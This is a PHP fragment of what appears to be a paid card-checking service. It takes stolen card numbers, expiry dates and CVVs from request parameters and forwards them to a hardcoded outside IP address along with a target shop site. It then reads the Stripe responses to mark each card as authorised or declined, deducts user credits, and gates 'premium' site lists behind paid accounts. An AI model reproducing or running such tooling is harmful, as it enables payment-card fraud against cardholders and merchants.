...
$cc1 = $_GET['cc'] ?? '';
$site = $_GET['siteLink'] ?? '';
$hitSender = $_GET['hitSender'] ?? 'both'; // Get hitSender from request or default to 'both'
$sitePackage = $_GET['sitePackage'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
...
if ($sitePackage) {
    $packageFiles = [
        'free' => 'freesitesv2.txt',
        'premium' => 'premiumsitesv2.txt'
    ];
    $file = __DIR__ . '/' . ($packageFiles[$sitePackage] ?? 'freesitesv2.txt');
    if (!file_exists($file)) {
        echo json_encode(['Response' => 'Package file not found']);
        exit;
    }
    // Restrict free users to free package
    if ($userStatus === 'FREE' && $sitePackage === 'premium') {
        echo json_encode(['Response' => 'Premium package not available for free users']);
        exit;
    }
    ...
    echo json_encode(['Response' => 'Invalid Site']);
    exit;
}
...
$requestUrl = "http://206.206.78.217:1012/?cc={$cc}|{$month}|{$year}|{$cvv}&getSite={$site}";
if ($proxyRequired) {
...
curl_close($ch);
// Process response
// $file = "woostripev1_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
...
if ((stripos($response, 'Payment method successfully added.') !== false)) {
    $err = 'Auth Success';
    ...
    $fullResult =
        ...
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Auto Stripe Auth V2\n" .
        "━━━━━━━━━━━\n" .
...
elseif (stripos($response, 'requires_action') !== false) {
    ...
    stripos($response, 'Incorrect Cvc') !== false
) {
    $err = 'Incorrect CVC ❎';
    $new_credits = updateCredits($pdo, $uid, 1, true, false);
    $fullResult =
